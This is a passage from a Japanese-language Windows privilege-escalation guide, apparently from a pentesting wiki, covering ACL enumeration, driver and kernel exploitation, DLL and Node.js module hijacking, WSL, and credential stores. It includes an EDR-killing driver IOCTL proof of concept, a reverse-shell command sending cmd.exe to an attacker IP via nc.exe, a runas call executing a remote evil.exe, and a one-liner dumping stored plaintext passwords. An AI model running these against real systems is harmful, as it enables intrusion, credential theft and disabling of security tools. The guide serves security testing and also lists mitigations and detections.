スケジュールタスクの場合は、アクションの [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) と、2つのサイドカーパスの ACL を確認してください。タスクで作業ディレクトリが指定されていない場合、実行ファイルのディレクトリは確認すべき手がかりにすぎず、タスクがそこから入力を読み込む証拠にはなりません。プロジェクトの作業ファイルに関する前提条件も満たされている必要があります。SYSTEM で実行されると決めつけず、実際のタスク principal を確認してください。

## Applications

### Installed Applications

**バイナリのアクセス許可**（上書きして privilege escalation できる可能性があります）と、**フォルダ**のアクセス許可（[DLL Hijacking](dll-hijacking/index.html)）を確認してください。

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows agent repair path

[CVE-2024-0670](https://checkmk.com/werk/16361) は、コマンドファイルを `C:\Windows\Temp` に書き込み、置き換えに失敗した場合に既存の書き込み保護されたファイルを実行していた、古い Checkmk Windows agent に影響します。ベンダーは 2.1.0p40、2.2.0p23、2.3.0b1、2.4.0b1 でこの問題を修正しました。インストールされているバージョンの完全なパッチレベルと、影響を受ける agent の操作を実行できるかを確認してください。`2.1` のようなブランチ名だけでは、影響の有無を判断できません。列挙では、ファイルを作成したり agent コマンドを実行したりせずに、バージョン、サービスの状態、Temp のアクセス許可を調べられます。

#### ADSelfService Plus SAML service review

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) は、ADSelfService Plus のビルド 6210 以前に影響し、ベンダーはビルド 6211 で修正しました。これは SAML SSO が有効に**なっている、または過去に有効だった**場合にのみ関係します。そのため、インストール済み製品のエントリやサービスパスは手掛かりにはなりますが、脆弱性の判定にはなりません。正確なビルド、SAML 設定の履歴、サービスへのネットワーク到達性、および実行アカウントを確認してください。サービス経由のコード実行は、そのアカウントの権限を継承します。SYSTEM として実行されるには、インスタンスが SYSTEM として実行されている必要があります。製品の Backup ディレクトリにある読み取り可能な `OfflineBackup_*.ezip` は、別個の暗号化バックアップに関する手掛かりであり、利用可能な認証情報やこの SAML の脆弱性を示す証拠ではありません。通常の列挙では展開せずに、そのパスとアクセス権を記録してください。

#### Jenkins controller and domain-account boundaries

Windows 上の Jenkins controller では、ジョブの作成・設定権限と、ジョブの開始権限を区別してください。[Jenkins のドキュメントでは、これらは別々の `Job/Create`、`Job/Configure`、`Job/Build` 権限として定義されています](https://www.jenkins.io/doc/book/security/access-control/permissions/)。設定済みのスケジュールやリモートトリガーが別のビルド経路になる場合もありますが、それが有効であり、ビルドが実際に実行されることを確認してください。実行時の ID は controller または選択された agent のものです。また、保存された認証情報を使用できるのは、ジョブがそのスコープにアクセスできる場合に限られます。これとは別に、`JENKINS_HOME` のメタデータへのアクセスを調べてください。Jenkins は認証情報のデータと暗号化キーを `credentials.xml`、`secrets/hudson.util.Secret`、`secrets/master.key` に保存します（[Jenkins のシークレットストレージ](https://www.jenkins.io/doc/developer/security/secrets/)）。これらが存在するだけではパスワードは判明しません。共有出力にシークレットを表示せず、**必要なファイルへの読み取りアクセス**と、別個のアカウント再利用経路があることを確認してください。そのアカウントが AD のユーザーオブジェクトの `scriptPath` に対する書き込み権限を持つ場合、対象ユーザーとして実行される実際のログオン処理またはスケジュールされた処理が、書き込み可能なスクリプトパスを使用することを確認してから、ユーザー間の実行経路と判断してください。さらにグループを制御できるかどうかは、AD の有効な権限を別途検証する必要があります。

#### Azure Pipelines self-hosted agent identity

Azure DevOps Server または Azure Pipelines のプロジェクトでは、パイプラインの**作成・編集**権限と、パイプラインを**キューに登録**して選択した agent pool を使用する権限を区別してください。[Microsoft はパイプラインの権限](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops)と[pool の認可](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops)を個別に説明しています。低権限アカウントがスクリプトステップを送信し、そのパイプラインを self-hosted Windows agent 上で実行できる場合、ステップは[agent に設定されたオペレーティングシステムアカウント](https://learn.microsoft.com/azure/devops/pipelines/agents/agents)として実行されます。ユーザー間または SYSTEM への移行を主張する前に、対象のパイプライン、ブランチ／リソースの制限、認可済み pool、実行可能なジョブ、agent サービスの ID を確認してください。agent のインストール、プロジェクトロール、リポジトリへの書き込み権限だけでは手掛かりに過ぎません。受動的な列挙では、ビルドを開始せずに権限とローカルサービスのメタデータを確認してください。

#### Microsoft Entra Connect Sync credentials

[Microsoft は](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions)、同期サービスを実行し SQL データベースにアクセスする **ADSync service account** と、ディレクトリ権限が設定済みの同期機能によって異なる **AD DS connector account** を区別しています。connector の認証情報はそのデータベースに暗号化して保存され、鍵の素材は[ADSync service account の下で DPAPI により保護されます](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account)。同期サービスがインストールされていること、ローカル管理者を連想させるグループ、またはデータベースを参照できることだけでは、復号可能な認証情報やドメイン権限昇格が確認されたことにはなりません。実際のデータベース読み取り権限、サービスアカウントと鍵へのアクセス、インストール先と SQL の構成、設定された connector の ID、およびその ID が持つ AD の有効な権限を個別に確認してください。通常の列挙では、サービスとアクセスに関するメタデータのみを表示し、保存されたシークレットの照会や出力は行わないでください。

#### Printer driver support DLL permissions

インストール済みの printer driver は、`C:\ProgramData` 配下に support DLL を置き、より高い権限を持つ印刷プロセス内で読み込む場合があります。printer の WMI 列挙が拒否される場合でも、親ディレクトリや reparse point を含め、該当する driver ディレクトリと DLL の ACL を確認してください。[Ricoh printer-driver の問題 CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) では、報告されたパスは `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz` でした。[元の開示情報](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/)には、`PrintIsolationHost.exe` による DLL の読み込みが記載されています。書き込み可能な ACL は手掛かりに過ぎません。拒否エントリ適用後の実効的な書き込み権限、該当する driver がインストールされていること、特権 ID でファイルを読み込むこと、およびベンダーの更新済み driver またはセキュリティプログラムでインストールが修正されているかを確認してください。ディレクトリ名や driver のバージョンだけから脆弱性を推測しないでください。

### Write Permissions

特権ファイルを読み取るために変更できる設定ファイルがないか、または Administrator アカウントによって実行されるバイナリ（schedtasks）を変更できないか確認してください。

システム内のアクセス許可が弱いフォルダーやファイルを見つける方法の一つは、次のとおりです。

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoloadによる永続化/実行

Notepad++は、`plugins`サブフォルダー内のplugin DLLを自動ロードします。書き込み可能なポータブル版/コピー版が存在する場合、悪意のあるpluginを配置すると、起動するたびに`notepad++.exe`内でコードが自動実行されます（`DllMain`やpluginコールバックからも実行可能です）。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### スタートアップ時の実行

**別のユーザーによって実行されるレジストリ項目やバイナリを上書きできるか確認してください。**\
**以下のページを読んで、権限昇格に利用できる興味深い** autoruns **の場所について詳しく学んでください。**


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### ドライバー

**サードパーティ製の不審な/脆弱な**ドライバーがないか探してください.

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

ドライバーが任意の kernel read/write プリミティブを公開している場合（設計の悪い IOCTL handler ではよく見られます）、kernel memory から SYSTEM token を直接盗むことで privilege escalation できます。<sup>[[13]](#references)</sup> 手順はこちらを参照してください。

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

脆弱な呼び出しが attacker-controlled な Object Manager path を開く race-condition bug では、lookup を意図的に遅らせる（最大長の component や深い directory chain を使用する）ことで、競合の時間をマイクロ秒から数十マイクロ秒に延ばせます。

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### Cancel-safe queue の UAF、paged-pool disclosure、I/O ring pivot

Windows kernel の LPE chain の中には、個々には弱い2つの bug から構成できるものがあります。1つは、queue lock を保持したまま request/CBD を解放する **cancel-safe queue の lifetime race**、もう1つは、`RtlCopyToUser` 中に解放済みの paged-pool allocation を leak する **lock-release-before-copy disclosure** です。<sup>[[29]](#references)</sup>

監査と exploit に関するメモ:

- **lock 保持中に解放し、その後 cancel**: success path が **Acquire -> CompleteRequest/free -> Release** を実行し、cancel path が **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** を実行する箇所を探します。success path が CBDQ/CSQ lock を解放する前に `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` に到達すると、`NtCancelIoFileEx -> IopCsqCancelRoutine` でブロックされていた thread が後から再開し、解放済みの `PFLT_CALLBACK_DATA` をドライバーの remove callback に渡す可能性があります。
- **解放済みの queue object を再利用**: 同じサイズの attacker-controlled な paged-pool allocation で再利用します。`NPFS` Data Queue Entries は、payload とサイズを制御でき、後から pipe の read/peek operation で調べられるため便利です。解放された object に list link が含まれる場合、link を **user memory 内の fake request node の循環リスト**で上書きし、元の list head で終了させず、ドライバーに attacker-defined な request structure を繰り返し処理させます。
- **予測可能な write を強化する**: fake request によって bookkeeping write（timestamp / QPC / refcount に隣接する field）で使われる nested context pointer を書き換えられる場合、**書き込み先 address は制御できても値は制御できない** kernel write を得られる可能性があります。その場合は、最終的な code/data pointer ではなく、spray した pool object の **length/size** field を狙い、その後 spray を列挙して、破損した object から **範囲外の paged-pool read** を実現します。
- **race 可能な disclosure のパターン**: `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` を実行する syscall は、いずれも有力な候補です。攻撃者がコピーされる buffer を拡大できる場合（たとえば、serializer の最終 allocation size を増やす list/resource entry を多数追加するなど）、信頼性が高まります。コピーにかかる時間が長くなり、必ずしもマシンをクラッシュさせずに、差し替え可能な時間枠を広げられるためです。
- **pointer の多い refill target**: Windows の **I/O ring** registered-buffer array は、paged-pool のサイズを攻撃者が制御でき（`8 * regBufferCnt`）、各要素が `_IOP_MC_BUFFER_ENTRY` への kernel pointer であるため、優れた disclosure target です。この array を1つ leak して周辺の `IORING_OBJECT` を特定し、**`RegBuffers`** と **`RegBuffersCount`** を破損させると、後続の I/O ring operation に attacker-forged な entry を使用させ、任意の kernel read/write を実現できます。利用可能な write が安定した byte（たとえば `KUSER_SHARED_DATA+0x14` の値）しか書けない場合は、**unaligned write を重ねて** `0x0101010101010101` のような同じ byte が繰り返される user pointer を構築し、`VirtualAlloc` でその領域を map して、偽造した registered-buffer array を配置します。<sup>[[30]](#references)</sup>

デバッグに役立つ指標:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Once you obtain arbitrary kernel read/write from the corrupted I/O ring, 標準的な post-primitive workflow を使って SYSTEM token を盗みます:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive のメモリ破損プリミティブ

最新の hive 脆弱性では、決定論的なメモリ配置を整え、書き込み可能な HKLM/HKU の子キーを悪用し、metadata corruption をカスタムドライバーなしで kernel paged-pool overflow に変換できます。攻撃チェーンの全容はこちら:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### 攻撃者が制御するパスによる `RtlQueryRegistryValues` の direct-mode type confusion

一部のドライバーは、ユーザーランドから registry path を受け取り、それが妥当な UTF-16 文字列であることだけを検証してから、`RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` を `int readValue` のようなスタック上のスカラーに対して `RTL_QUERY_REGISTRY_DIRECT` で呼び出します。`RTL_QUERY_REGISTRY_TYPECHECK` が指定されていない場合、`EntryContext` は開発者が想定した型ではなく、**実際の** registry type に従って解釈されます。

これにより、次の2つの有用なプリミティブが生まれます:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: ユーザー制御の絶対パス `\Registry\...` を使うと、ドライバーに攻撃者が選んだキーを照会させ、戻り値やログからキーの存在を漏えいさせられます。また、呼び出し元が直接アクセスできない値を読み取れる場合もあります。
- **Kernel memory corruption**: `&readValue` のようなスカラーの格納先は、registry value type に応じて `REG_QWORD`、`UNICODE_STRING`、またはサイズ指定されたバイナリバッファとして type confusion を起こします。

実際の exploit に関する注意点:

- **Windows 8 以降の緩和策**: `RTL_QUERY_REGISTRY_TYPECHECK` を指定せずに `RTL_QUERY_REGISTRY_DIRECT` で **untrusted hive** を照会すると、kernel caller は `KERNEL_SECURITY_CHECK_FAILURE (0x139)` でクラッシュします。exploit 可能な状態を維持するには、値を `HKCU` の下に配置するのではなく、**trusted system hive 内の攻撃者が書き込み可能なキー**を探してください。
- **Trusted-hive staging**: NtObjectManager を使って `\Registry\Machine` 配下の書き込み可能な子キーを列挙し、複製した **low-integrity** token でもスキャンを再実行して、sandboxed context からアクセス可能なキーを見つけます:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: 4-byte `int` に8バイトを直接書き込むと、隣接するスタックデータが破損し、近くのcallback/function pointerが部分的に上書きされる可能性があります。
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct modeでは、`EntryContext`が`UNICODE_STRING`を指していることが前提です。コードが攻撃者制御の`REG_DWORD`をスタックスカラーに読み込み、その後同じバッファを文字列の読み込みに再利用する場合、攻撃者は`Length`/`MaximumLength`を制御し、`Buffer`ポインターにも部分的に影響を与えられるため、ある程度制御可能なkernel writeが発生します。
- **`REG_BINARY`**: 大きなバイナリデータの場合、direct modeは`EntryContext`の先頭にある`LONG`を符号付きバッファサイズとして扱います。先行する`REG_DWORD`の読み込みによって、再利用されるスカラーに攻撃者制御の**負の値**が残っていると、次の`REG_BINARY`クエリで攻撃者のバイト列が隣接するスタックスロットに直接コピーされます。これは、callback pointerを完全に上書きする最も簡潔な方法であることがよくあります。

有力な探索パターン: **初期化し直さずに、異なる型のレジストリ読み込みを同じスタック変数に行うこと**。`RTL_REGISTRY_ABSOLUTE`、`RTL_QUERY_REGISTRY_DIRECT`、再利用される`EntryContext`ポインター、および最初のレジストリ読み込みによって2回目の読み込みが行われるかどうかが決まるコードパスをgrepします。

#### デバイスオブジェクトでのFILE_DEVICE_SECURE_OPEN未設定の悪用（LPE + EDR kill）

一部の署名済みサードパーティドライバーは、IoCreateDeviceSecureを使って強固なSDDLを設定したデバイスオブジェクトを作成しますが、DeviceCharacteristicsにFILE_DEVICE_SECURE_OPENを設定し忘れています。このフラグがないと、余分なコンポーネントを含むパス経由でデバイスを開く際にセキュアDACLが適用されず、以下のようなnamespace pathを使えば、権限のないユーザーでもハンドルを取得できます:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile（実際の事例）

ユーザーがデバイスを開けるようになると、ドライバーが公開する特権IOCTLを悪用して、LPEや改ざんを実行できます。実環境で確認された機能の例:
- 任意のプロセスに対するフルアクセスハンドルの返却（token theft / DuplicateTokenEx/CreateProcessAsUserによるSYSTEM shell）。
- 制限のないraw disk read/write（オフライン改ざん、起動時の永続化手法）。
- Protected Process/Light（PP/PPL）を含む任意のプロセスの終了。これにより、kernel経由でuser landからAV/EDR killが可能になります。

最小限のPoCパターン（user mode）:
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

開発者向けの緩和策
- DACL によってアクセスを制限するデバイスオブジェクトを作成する場合は、必ず FILE_DEVICE_SECURE_OPEN を設定してください。
- 特権操作を行う呼び出し元のコンテキストを検証してください。プロセスの終了やハンドルの返却を許可する前に、PP/PPL チェックを追加してください。
- IOCTL を制約してください（アクセスマスク、METHOD_*、入力検証）。カーネル特権を直接使用する代わりに、brokered model の採用も検討してください。

防御側の検知アイデア
- 疑わしいデバイス名（例：`\\ .\\amsdk*`）のユーザーモードからのオープンや、悪用を示唆する特定の IOCTL シーケンスを監視してください。
- Microsoft の脆弱なドライバーのブロックリスト（HVCI/WDAC/Smart App Control）を適用し、独自の許可／拒否リストも維持してください。


## PATH DLL Hijacking

**PATH 上にあるフォルダー内への書き込み権限**があれば、プロセスによって読み込まれる DLL を hijack して、**権限昇格**できる可能性があります。<sup>[[2]](#references)</sup>

PATH 内のすべてのフォルダーのアクセス権を確認してください。

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

このチェックを悪用する方法の詳細については、以下を参照してください。


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` 経由の Node.js / Electron モジュール解決ハイジャック

これは、`require("foo")` のような bare import を実行した際に、想定されたモジュールが**見つからない**場合に、**Node.js** および **Electron** アプリケーションに影響する **Windows uncontrolled search path** の亜種です。<sup>[[20]](#references)</sup>

Node はディレクトリツリーを上方向にたどり、各親ディレクトリの `node_modules` フォルダを確認してパッケージを解決します。Windows では、この探索がドライブのルートに達することがあります。そのため、`C:\Users\Administrator\project\app.js` から起動したアプリケーションは、次の場所を順に確認する可能性があります。<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**低権限ユーザー**が `C:\node_modules` を作成できる場合、悪意のある `foo.js`（またはパッケージフォルダ）を配置し、**より高い権限で動作する Node/Electron プロセス**が見つからない依存関係を解決するのを待つことができます。ペイロードは被害プロセスのセキュリティコンテキストで実行されるため、対象が管理者として実行される場合、昇格されたスケジュールタスク／サービスラッパーから実行される場合、または特権を持つデスクトップアプリが自動起動する場合、これは **LPE** につながります。

これは特に次のような場合によく見られます。

- 依存関係が `optionalDependencies` で宣言されている<sup>[[22]](#references)</sup>
- サードパーティ製ライブラリが `require("foo")` を `try/catch` で囲み、失敗しても処理を続ける
- 本番ビルドからパッケージが削除された、パッケージ化時に含め忘れた、またはインストールに失敗した
- 脆弱な `require()` がメインアプリケーションのコードではなく、依存関係ツリーの深い場所にある

### 脆弱なターゲットの調査

**Procmon** を使用して解決パスを確認します。<sup>[[23]](#references)</sup>

- `Process Name` = 対象の実行ファイル（`node.exe`、Electron アプリの EXE、またはラッパープロセス）でフィルターする
- `Path` に `node_modules` が `contains` される条件でフィルターする
- `NAME NOT FOUND` と、`C:\node_modules` で最後に成功したオープンに注目する

展開済みの `.asar` ファイルやアプリケーションのソースで役立つコードレビューのパターン:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Procmon またはソースレビューから**不足しているパッケージ名**を特定します。
2. 存在しない場合は、root の検索ディレクトリを作成します。

```powershell
mkdir C:\node_modules
```

3. 想定される名前と完全に一致する名前でモジュールを配置する：

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. 被害者アプリケーションを起動します。アプリケーションが `require("foo")` を実行し、正規のモジュールが存在しない場合、Node は `C:\node_modules\foo.js` を読み込む可能性があります。

このパターンに当てはまる、実際に使われている欠落した optional module の例として `bluebird` と `utf-8-validate` があります。ただし、再利用可能な部分は**手法**です。特権で実行される Windows の Node/Electron プロセスが解決する、欠落した bare import を見つけてください。

### 検知とハードニングのアイデア

- ユーザーが `C:\node_modules` を作成したり、新しい `.js` ファイルやパッケージを書き込んだりしたときにアラートを出す。
- 高い整合性レベルで実行されるプロセスが `C:\node_modules\*` から読み込んでいないか調査する。
- 本番環境ではすべてのランタイム依存関係をパッケージ化し、`optionalDependencies` の使用状況を監査する。
- サードパーティのコードに、エラーを無視する `try { require("...") } catch {}` パターンがないか確認する。
- ライブラリがサポートしている場合は optional probe を無効にする（たとえば、一部の `ws` 環境では `WS_NO_UTF_8_VALIDATE=1` を設定することで、レガシーな `utf-8-validate` probe を回避できる）。

## ネットワーク

### 共有フォルダー

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hostsファイル

hostsファイルにハードコードされている他の既知のコンピューターを確認します。

```
type C:\Windows\System32\drivers\etc\hosts
```

### ネットワークインターフェースと DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### 開いているポート

外部から**制限されたサービス**を確認する

```bash
netstat -ano #Opened ports?
```

ローカルのリスナーについては、PIDをプロセス所有者、実行ファイルのパス、および起動元のサービスやスケジュールされたタスクと照合します。リモートコントロールサービスでデスクトップユーザーとしてアクセスできるかどうかは、認証とコマンド制御の設定によります。より高い権限を持つアカウントで実行されているカスタムTCPアプリケーションは、別途調査すべき対象です。リスナーとバイナリのパスは受動的な手がかりにすぎません。認証を経由するメモリ破損の経路を確認するには、その正確なバイナリと、そこに到達可能な入力を分析する必要があります。公開ポートがシステムプロセスに属しているように見える場合、バックエンドサービスを特定する前に、[`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) と比較してください。転送ルールがあるだけでは、転送先に到達可能であることや、脆弱であることの証明にはなりません。

### ルーティングテーブル

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP テーブル

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### ファイアウォール ルール

[**ファイアウォール関連のコマンドについてはこのページを確認してください**](../basic-cmd-for-pentesters.md#firewall) **（ルールの一覧表示、ルールの作成、無効化、無効化など）**

[ネットワーク列挙用のコマンドはこちら](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

バイナリの `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にもあります。

root ユーザーを取得すると、任意のポートでリッスンできます（初めて `nc.exe` でポートをリッスンするときは、ファイアウォールで `nc` を許可するかどうかを GUI で確認されます）。

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

root として bash を簡単に起動するには、`--default-user root` を試してください。

`C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` フォルダーで `WSL` ファイルシステムを確認できます。

WSL 内の Linux の `root` であっても、それだけで Windows の Administrator 権限が得られるわけではありません。現在の Windows ID でディストリビューションのファイルシステムを読み取れる場合は、コマンドとともに認証情報が記録されている可能性があるため、シェル履歴ファイル（`/root/.bash_history` など）を確認してください。ただし、権限昇格には、より高い権限を持つ有効なアカウントと、許可された認証経路が必要です。`LocalState\rootfs` という構成は古い WSL インストールに適用されます。WSL 2 では通常、ディストリビューションは [`ext4.vhdx` 仮想ディスク](https://learn.microsoft.com/en-us/windows/wsl/disk-space) に保存されるため、まず実際のディストリビューションと保存場所を特定してください。自動列挙中に履歴の内容を出力しないでください。

## Windows 認証情報

### Winlogon 認証情報

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

`DefaultUserName` と `DefaultDomainName` は認証情報ではなく、アカウントのコンテキストとして扱ってください。空でない `DefaultPassword` または `AltDefaultPassword` の値があれば、レジストリ内に平文の認証情報が存在することを示します。`AutoAdminLogon=1` でも平文のパスワードを読み取れない場合は、あくまで調査の手がかりにとどまります。[Sysinternals Autologon はパスワードを LSA secret として保存することがあります](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon)。通常のレジストリ読み取りだけでは、その secret が存在するか、取得できるかは確認できません。認証情報の露出を報告する前に、アクセス権と実際のログオン構成を確認してください。

### Credential Manager / Windows Vault

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup> より\
Windows Vault は、サーバー、Web サイト、その他のプログラム用のユーザー認証情報を保存します。**Windows** はこれらを使って、**ユーザーを自動的にログインさせる**ことができます。最初は、Facebook、Twitter、Gmail などのサイトの認証情報を保存し、ブラウザーで自動ログインできるようにする機能のように思えるかもしれませんが、実際はそうではありません。

Windows Vault は、Windows がユーザーを自動的にログインさせるための認証情報を保存します。つまり、リソース（サーバーや Web サイト）へのアクセスに認証情報が必要な **Windows アプリケーションは、Credential Manager と Windows Vault を利用**し、ユーザーが毎回ユーザー名とパスワードを入力する代わりに、保存された認証情報を使用できます。

アプリケーションが Credential Manager と連携しない限り、特定のリソース用の認証情報を利用することはできないと思います。そのため、アプリケーションで Vault を利用するには、何らかの方法で **Credential Manager と通信し、既定のストレージ Vault からそのリソースの認証情報を要求する**必要があります。

`cmdkey` を使って、マシンに保存されている認証情報を一覧表示します。

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

その後、保存された資格情報を使用するために、`/savecred` オプションを指定して `runas` を使用できます。以下の例では、SMB share 経由でリモートバイナリを呼び出しています。

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

提供された認証情報で `runas` を使う。

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)、または[Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)から取得できることに注意してください。

### UWP PasswordVault / Credential Locker

最新の Windows UWP アプリケーション、Microsoft Edge、および最新のシステムサービスは、Universal Windows Platform (UWP) の `PasswordVault`（`vaultcmd` では `Web Credentials` としても表示されます）に認証トークンと平文パスワードを保存します。このストレージ領域はセッションごとに分離されており、管理者権限や `SeDebugPrivilege` なしでネイティブに復号できます。

ユーザーのアクティブなセッション内で次の PowerShell コマンドを実行すると、保存されているすべてのユーザー名と平文パスワードを即座にダンプして復号できます。

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** は、データを対称暗号化するための方法を提供します。主に Windows オペレーティングシステム内で、非対称秘密鍵の対称暗号化に使用されます。この暗号化では、ユーザーまたはシステムのシークレットを利用して、エントロピーを大幅に高めます。

